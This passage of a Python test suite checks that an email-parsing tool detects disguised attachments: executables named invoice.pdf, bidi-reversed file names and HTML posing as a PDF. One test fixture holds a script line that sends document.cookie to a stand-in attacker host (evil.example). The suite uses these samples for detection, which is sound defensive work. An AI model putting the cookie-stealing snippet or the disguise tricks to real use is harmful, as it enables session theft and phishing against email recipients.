        b"Content-Type: application/pdf; name=invoice.pdf\r\n"
        b"Content-Disposition: attachment; filename=invoice.pdf\r\n"
        b"Content-Transfer-Encoding: base64\r\n\r\n" + _b64(PE)
        + b"\r\n--M--\r\n--A--\r\n")
    return [one_att, single_rfc822, alternative, related,
            _nested_rfc822_in_mixed(3), continuations, qp,
            mixed_in_alternative]


_FZ_TOKENS = [
    b"=?utf-8?q?=0A?=", b"=?utf-8?b?", b"?=", b"%0A", b"%00", b"((", b"))",
    b"\"", b"\\", b"<", b">", b",", b";", b"=", b"*", b"'", b"\r\n", b"\n",
    b"\r", b"\r\n\r\n", b"--B", b"--B--", b"--A", b"--R", b"--b0",
    b"Content-Type: message/rfc822\r\n",
    b"Content-Type: multipart/mixed; boundary=B\r\n",
    b"Content-Transfer-Encoding: base64\r\n",
    b"Content-Transfer-Encoding: quoted-printable\r\n", b"charset=x-bogus",
    b"charset=utf-16", b"filename*0*=utf-8''%E9", b"name*=''", b"\xff",
    b"\x00", b"\t", b" ", b":", b"@",
    b"From: =?utf-8?q?a=0Ab?= " + b"x" * 77 + b" <a@b>\r\n",
    b"Content-Disposition: attachment; filename*=utf-8''a%0Ab\r\n", b"=\r\n",
    b"=ZZ", b"=?", b"?q?", b"?b?"]


def _fz_mutate(rng, data):
    data = bytearray(data)
    for _ in range(rng.randint(1, 6)):
        op = rng.random()
        pos = rng.randrange(len(data) + 1)
        if op < 0.45:
            data[pos:pos] = rng.choice(_FZ_TOKENS)
        elif op < 0.6 and data:
            end = min(len(data), pos + rng.randint(1, 40))
            del data[pos:end]
        elif op < 0.75 and data:
            end = min(len(data), pos + rng.randint(1, 200))
            data[pos:pos] = data[pos:end] * rng.randint(1, 3)
        elif op < 0.9 and data:
            data[min(pos, len(data) - 1)] = rng.randrange(256)
        else:
            data[pos:pos] = bytes(rng.randrange(256)
                                  for _ in range(rng.randint(1, 8)))
    return bytes(data)


def fuzzed_mails(numbers):
    """The cases of the reviewer's sequence at ``numbers``, in order."""
    wanted, seeds, rng, found = set(numbers), _fz_seeds(), random.Random(1), []
    for number in range(max(wanted) + 1):
        data = _fz_mutate(rng, rng.choice(seeds))
        if number in wanted:
            found.append(data)
    return found


#: Filled in from the reviewer's run: the numbers of the 462 cases that
#: raised, and the SHA-256 of their bytes joined, which proves the sequence
#: rebuilt here is the one the reviewer ran.
FUZZ_FAILED = [
    124, 838, 964, 979, 1211, 1470, 2744, 3155, 3225, 3322, 3416, 3480, 3617,
    3687, 4068, 4256, 4544, 4593, 4610, 4687, 4694, 4790, 5230, 5643, 5933,
    6261, 6353, 6358, 6654, 6781, 6912, 7247, 7263, 7455, 7770, 8380, 8424,
    8667, 8674, 9272, 9389, 9573, 9692, 9764, 10166, 10252, 10355, 10398,
    10498, 10566, 10567, 11288, 11366, 11498, 12021, 12168, 12211, 12433,
    12472, 12782, 13826, 13849, 13982, 14438, 14462, 14500, 14605, 14687,
    14707, 14761, 14940, 15028, 15679, 16392, 16672, 16777, 16853, 17034,
    17338, 17347, 17352, 17353, 17573, 17575, 17661, 17771, 17784, 17943,
    17974, 18045, 18128, 18408, 18445, 18456, 18913, 19238, 19622, 19729,
    19827, 20067, 20127, 20464, 20610, 20949, 21138, 21244, 21424, 21901,
    22110, 22631, 22639, 23233, 23236, 23251, 23340, 23742, 24148, 24453,
    24538, 24672, 24763, 25134, 25139, 25280, 25338, 25607, 26118, 26163,
    26318, 26331, 26382, 26512, 26957, 27027, 27246, 27398, 27610, 27718,
    27725, 27780, 27856, 28750, 29295, 29538, 29765, 29994, 30715, 30899,
    31004, 31159, 31504, 31561, 31762, 31907, 31970, 32866, 32969, 33123,
    33289, 33314, 33418, 34435, 34567, 34610, 34770, 34809, 34867, 35330,
    35679, 35733, 35857, 35907, 36160, 36170, 36469, 36510, 36636, 36927,
    37199, 37309, 37345, 37770, 37969, 37970, 38075, 38226, 38241, 38502,
    38521, 38533, 38601, 38635, 38694, 38815, 39243, 39446, 39480, 39520,
    39662, 39716, 40209, 40345, 40564, 40937, 41221, 41248, 41264, 41523,
    42036, 42188, 42496, 42687, 42708, 42863, 42881, 43174, 43542, 43831,
    43927, 44013, 44326, 44540, 44746, 45218, 45313, 45419, 45744, 45773,
    46040, 46394, 46803, 46881, 47215, 47554, 47619, 47814, 48033, 48103,
    48234, 48587, 48787, 49157, 49321, 49416, 49431, 49835, 50001, 50285,
    50449, 50853, 52048, 52386, 52641, 52727, 52936, 53091, 53665, 53998,
    54281, 54325, 54683, 54800, 54881, 55203, 55260, 55486, 55793, 55904,
    56090, 56498, 56760, 56850, 56951, 57085, 57259, 57574, 57634, 57721,
    57806, 57813, 58252, 58488, 58816, 58934, 59093, 59358, 59523, 59532,
    59800, 59849, 59938, 60223, 60264, 60452, 60602, 60958, 61218, 61604,
    61686, 61961, 62163, 62324, 62645, 62985, 63109, 63421, 63474, 63819,
    63902, 64010, 64141, 64228, 64309, 64354, 64365, 64695, 64760, 64841,
    65370, 65385, 65468, 66086, 66152, 66223, 66392, 66608, 67171, 67500,
    67906, 68274, 68548, 68748, 68764, 68803, 68993, 69476, 69604, 69684,
    70253, 70883, 71490, 71910, 72030, 72113, 72443, 72801, 72910, 73197,
    73270, 73973, 73977, 74028, 74201, 74213, 74232, 74329, 74424, 74568,
    74823, 75097, 75190, 75224, 75369, 75456, 75494, 75646, 76132, 76192,
    76230, 76487, 76530, 77188, 77241, 77336, 77481, 77547, 77799, 77830,
    77859, 78183, 78319, 78348, 78377, 78620, 78831, 78892, 79011, 79041,
    79223, 79267, 79393, 79500, 79771, 79896, 80050, 80119, 80408, 81339,
    81452, 81529, 81564, 81787, 81855, 81977, 82377, 83082, 83213, 83216,
    83303, 83337, 83441, 83476, 83604, 83618, 83753, 83875, 83928, 84341,
    84363, 84531, 84756, 84869, 84990, 85047, 85184, 85763, 85962, 86302,
    86345, 86570, 86677, 87174, 87254, 87256, 87326, 87468, 87750, 88078,
    88289, 88617, 88828, 88896, 88979, 89252, 89376, 89674, 89909, 90137,
    90162, 90187, 90225, 90241, 90265, 90386, 90390, 90391, 90526, 90562,
    91115, 91297, 91697, 91785]
FUZZ_DIGEST = ("51d4cd3e798ab15ba2dd5b8737a5d0c086b5581a0e8a73b3008ec7890cf3cb7a")


class FuzzedMailTest(_Mails):
    def test_the_sequence_is_the_reviewers(self):
        self.assertEqual(462, len(FUZZ_FAILED))
        digest = hashlib.sha256(b"".join(fuzzed_mails(FUZZ_FAILED)))
        self.assertEqual(FUZZ_DIGEST, digest.hexdigest())

    def test_none_of_the_fuzzed_mails_is_blanked(self):
        for number, data in zip(FUZZ_FAILED, fuzzed_mails(FUZZ_FAILED)):
            with self.subTest(number=number):
                ex = self.raw(data)
                self.assertTrue(ex.text.startswith("# Email"), ex.text[:80])
                ex = self.ex(data)
                self.assertNotIn("extractor_error", ex.metadata)


# ---- MEDIUM-2: attachments inside an alternative ---------------------------

class AlternativeTest(_Mails):
    """iter_attachments() yields nothing for multipart/alternative, and
    skips an alternative inside a mixed part as a candidate body: a Windows
    program named invoice.pdf as a third alternative, or in a mixed part
    inside one, was no attachment and no warning."""

    def test_a_program_as_a_third_alternative(self):
        ex = self.ex(_mail(
            b"Content-Type: multipart/alternative; boundary=A",
            b"--A\r\nContent-Type: text/plain\r\n\r\ninvoice\r\n--A\r\n"
            b"Content-Type: text/html\r\n\r\n<p>invoice</p>\r\n--A\r\n"
            b"Content-Type: application/pdf; name=invoice.pdf\r\n"
            b"Content-Disposition: attachment; filename=invoice.pdf\r\n"
            b"Content-Transfer-Encoding: base64\r\n\r\n" + _b64(PE)
            + b"\r\n--A--\r\n"))
        self.assertEqual(1, ex.metadata["attachment_count"])
        self.assertEqual("pe-executable",
                         ex.metadata["attachments"][0]["contents_are"])
        self.assertTrue(any("invoice.pdf" in w for w in ex.warnings))
        self.assertIn("invoice", ex.text)

    def test_a_program_in_a_mixed_part_inside_an_alternative(self):
        ex = self.ex(_fz_seeds()[7])
        self.assertEqual(1, ex.metadata["attachment_count"])
        self.assertTrue(any("invoice.pdf" in w for w in ex.warnings))

    def test_an_alternative_inside_a_mixed_part(self):
        ex = self.ex(_mail(
            b"Content-Type: multipart/mixed; boundary=M",
            b"--M\r\nContent-Type: multipart/alternative; boundary=A\r\n\r\n"
            b"--A\r\nContent-Type: text/plain\r\n\r\ninvoice\r\n--A\r\n"
            b"Content-Type: text/html\r\n\r\n<p>invoice</p>\r\n--A\r\n"
            b"Content-Type: application/pdf; name=invoice.pdf\r\n"
            b"Content-Transfer-Encoding: base64\r\n\r\n" + _b64(PE)
            + b"\r\n--A--\r\n--M\r\nContent-Type: text/plain; name=a.txt\r\n"
            b"Content-Disposition: attachment; filename=a.txt\r\n\r\nnotes"
            b"\r\n--M--\r\n"))
        self.assertEqual(["invoice.pdf", "a.txt"],
                         [a["filename"] for a in ex.metadata["attachments"]])

    def test_two_renderings_are_no_attachment(self):
        ex = self.ex(_fz_seeds()[2])
        self.assertEqual(0, ex.metadata["attachment_count"])
        self.assertEqual("text/plain", ex.metadata["body_format"])

    def test_a_calendar_rendering_is_no_attachment(self):
        ex = self.ex(_mail(
            b"Content-Type: multipart/alternative; boundary=A",
            b"--A\r\nContent-Type: text/plain\r\n\r\nMeeting\r\n--A\r\n"
            b"Content-Type: text/html\r\n\r\n<p>Meeting</p>\r\n--A\r\n"
            b"Content-Type: text/calendar; method=REQUEST\r\n\r\n"
            b"BEGIN:VCALENDAR\r\nEND:VCALENDAR\r\n--A--\r\n"))
        self.assertEqual(0, ex.metadata["attachment_count"])

    @staticmethod
    def _inline(image, name=b"logo.png"):
        return _mail(
            b"Content-Type: multipart/alternative; boundary=A",
            b"--A\r\nContent-Type: text/plain\r\n\r\ninvoice\r\n--A\r\n"
            b"Content-Type: multipart/related; boundary=R\r\n\r\n--R\r\n"
            b"Content-Type: text/html\r\n\r\n<p>invoice <img src=cid:l></p>"
            b"\r\n--R\r\nContent-Type: image/png; name=" + name
            + b"\r\nContent-ID: <l>\r\nContent-Transfer-Encoding: base64"
            b"\r\n\r\n" + _b64(image) + b"\r\n--R--\r\n--A--\r\n")

    def test_the_bodys_inline_image_is_no_attachment(self):
        ex = self.ex(self._inline(_FZ_PNG))
        self.assertEqual(0, ex.metadata["attachment_count"])
        self.assertEqual([], ex.warnings)

    def test_a_program_as_the_bodys_inline_image_is_one(self):
        ex = self.ex(self._inline(PE))
        self.assertEqual([("logo.png", "pe-executable")],
                         [(a["filename"], a.get("contents_are"))
                          for a in ex.metadata["attachments"]])
        self.assertTrue(any("logo.png" in w for w in ex.warnings))


# ---- MEDIUM-3: how many parts ------------------------------------------------

def _many_parts(n, name=b"f%d.txt"):
    parts = [b"--B\r\nContent-Type: text/plain\r\n\r\nbody text\r\n"]
    for i in range(n):
        parts.append(b"--B\r\nContent-Type: text/plain\r\nContent-Disposition:"
                     b" attachment; filename=" + name % i + b"\r\n\r\npart %d"
                     b"\r\n" % i)
    return _mail(b"Content-Type: multipart/mixed; boundary=B",
                 b"".join(parts) + b"--B--\r\n")


class PartCountTest(_Mails):
    """40,000 parts took 31 s, and the list of them, the "Attachments:" line
    and every name in it had no bound. An archive's listing is the model:
    fallback.MAX_LISTED named, the count going on past it."""

    def test_the_list_names_as_many_as_an_archive_listing(self):
        from sift.extract import fallback
        self.assertEqual(fallback.MAX_LISTED, email_msg._MAX_LISTED)
        ex = self.ex(_many_parts(200))
        self.assertEqual(200, ex.metadata["attachment_count"])
        self.assertEqual(fallback.MAX_LISTED,
                         len(ex.metadata["attachments"]))
        line = next(l for l in ex.text.splitlines()
                    if l.startswith("Attachments:"))
        self.assertTrue(line.endswith(
            f", … and {200 - fallback.MAX_LISTED} more"), line[-80:])

    def test_a_list_at_the_bound_is_whole(self):
        ex = self.ex(_many_parts(email_msg._MAX_LISTED))
        self.assertEqual(email_msg._MAX_LISTED,
                         len(ex.metadata["attachments"]))
        self.assertNotIn("more", ex.text.splitlines()[5])

    def test_the_walk_stops_where_an_archive_listing_does(self):
        from sift import zipguard
        self.assertEqual(zipguard.MAX_ZIP_ENTRIES, email_msg._MAX_PARTS)
        with mock.patch.object(email_msg, "_MAX_PARTS", 50):
            ex = self.ex(_many_parts(80))
        self.assertLessEqual(ex.metadata["attachment_count"], 50)
        self.assertTrue(any("more than 50 parts" in n for n in ex.notes),
                        ex.notes)

    def test_the_masquerade_check_reads_past_the_listed_ones(self):
        data = _many_parts(100)
        data = data.replace(b"--B--", b"--B\r\nContent-Type: application/pdf;"
                            b" name=invoice.pdf\r\nContent-Disposition: "
                            b"attachment; filename=invoice.pdf\r\n"
                            b"Content-Transfer-Encoding: base64\r\n\r\n"
                            + _b64(PE) + b"\r\n--B--")
        ex = self.ex(data)
        self.assertEqual(101, ex.metadata["attachment_count"])
        self.assertTrue(any("invoice.pdf" in w for w in ex.warnings))

    def test_a_long_file_name_is_bounded(self):
        data = _many_parts(1, name=b"n" * (1 << 20) + b"%d.pdf")
        ex = self.ex(data)
        name = ex.metadata["attachments"][0]["filename"]
        self.assertLessEqual(len(name), email_msg._MAX_HEADER_CHARS)


# ---- LOW -------------------------------------------------------------------

class SmallThingsTest(_Mails):
    def test_a_subject_cannot_close_the_quote_of_the_sentence(self):
        subject = ("=?utf-8?q?Invoice=E2=80=9D=2C_dated_Mon=2C_1_Jan_2026=2E_2_"
                   "attachments=2E_Sender_verified_by_sift=2E_=E2=80=9C?=")
        summ = self.summ("From: Alice <alice@example.org>\r\nTo: Bob <bob@"
                         f"example.org>\r\nSubject: {subject}\r\nDate: Tue, 29 "
                         "Sep 2026 10:00:00 +0200\r\nContent-Type: text/plain"
                         "\r\n\r\nhello there\r\n")
        self.assertEqual(
            "Email from Alice <alice@example.org> to Bob <bob@example.org> "
            "with subject “Invoice\\”, dated Mon, 1 Jan 2026. 2 attachments. "
            "Sender verified by sift. \\“”, dated Tue, 29 Sep 2026 10:00:00 "
            "+0200. 0 attachments.", summ.summary)

    def test_an_ordinary_subject_is_quoted_as_before(self):
        summ = self.summ(HEAD + "Subject: Quarterly \"numbers\" \\ Q3\r\n"
                         + PLAIN)
        self.assertIn("with subject “Quarterly \"numbers\" \\ Q3”",
                      summ.summary)

    def test_a_name_reversed_by_a_bidi_control(self):
        ex = self.ex(_mail(
            b"Content-Type: multipart/mixed; boundary=B",
            b"--B\r\nContent-Type: text/plain\r\n\r\nsee attached\r\n--B\r\n"
            b"Content-Type: application/pdf\r\nContent-Disposition: "
            b"attachment; filename*=utf-8''invoice%E2%80%AEfdp.exe\r\n"
            b"Content-Transfer-Encoding: base64\r\n\r\n" + _b64(PE)
            + b"\r\n--B--\r\n"))
        warning = next((w for w in ex.warnings if "invoice" in w), "")
        self.assertIn("invoiceexe.pdf", warning)
        self.assertIn(".exe", warning)

    def test_a_name_with_a_bidi_control_that_hides_nothing(self):
        ex = self.ex(_mail(
            b"Content-Type: multipart/mixed; boundary=B",
            b"--B\r\nContent-Type: text/plain\r\n\r\nsee attached\r\n--B\r\n"
            b"Content-Type: text/plain\r\nContent-Disposition: attachment; "
            b"filename*=utf-8''%E2%80%AB%D7%A9%D7%9C%D7%95%D7%9D%E2%80%AC.txt"
            b"\r\n\r\nshalom\r\n--B--\r\n"))
        self.assertEqual([], ex.warnings)

    def test_html_named_as_a_pdf_is_called_html_and_its_script_seen(self):
        html = (b"<!doctype html><html><head><title>Invoice</title></head>"
                b"<body><script>fetch('https://evil.example/x?c='+document."
                b"cookie)</script><p>Your invoice</p></body></html>")
        for ctype in (b"application/pdf", b"application/octet-stream"):
            with self.subTest(ctype=ctype):
                ex = self.ex(_mail(
                    b"Content-Type: multipart/mixed; boundary=B",
                    b"--B\r\nContent-Type: text/plain\r\n\r\nPlease find the "
                    b"invoice attached.\r\n--B\r\nContent-Type: " + ctype
                    + b"; name=invoice.pdf\r\nContent-Disposition: attachment;"
                    b" filename=invoice.pdf\r\nContent-Transfer-Encoding: "
                    b"base64\r\n\r\n" + _b64(html) + b"\r\n--B--\r\n"))
                self.assertIn("an HTML page",
                              ex.metadata["attachments"][0]["contents_are"])
                self.assertIn("html-script",
                              ex.metadata["active_content"]["classes"])

    def test_text_named_as_a_pdf_is_still_text(self):
        ex = self.ex(_mail(
            b"Content-Type: multipart/mixed; boundary=B",
            b"--B\r\nContent-Type: text/plain\r\n\r\nsee\r\n--B\r\n"
            b"Content-Type: application/pdf; name=a.pdf\r\n"
            b"Content-Transfer-Encoding: base64\r\n\r\n"
            + _b64(b"just some words, and a < b > c") + b"\r\n--B--\r\n"))
        self.assertEqual("text", ex.metadata["attachments"][0]["contents_are"])
        self.assertEqual([], ex.metadata["active_content"]["classes"])

    def test_a_boundary_declared_twice_is_said(self):
        ex = self.ex(_mail(
            b'Content-Type: multipart/mixed; boundary="A"; boundary="X"',
            b"--X\r\nContent-Type: text/plain\r\n\r\nThe body text X.\r\n--X\r\n"
            b"Content-Type: text/plain\r\nContent-Disposition: attachment; "
            b"filename=x.txt\r\n\r\nxx\r\n--X--\r\n--A\r\nContent-Type: "
            b"text/plain\r\n\r\nThe body text A.\r\n--A--\r\n"))
        self.assertTrue(any("boundary" in n and "twice" in n
                            for n in ex.notes), ex.notes)

    def test_one_boundary_is_no_note(self):
        ex = self.ex(_fz_seeds()[0])
        self.assertEqual([], [n for n in ex.notes if "boundary" in n])


if __name__ == "__main__":
    unittest.main()
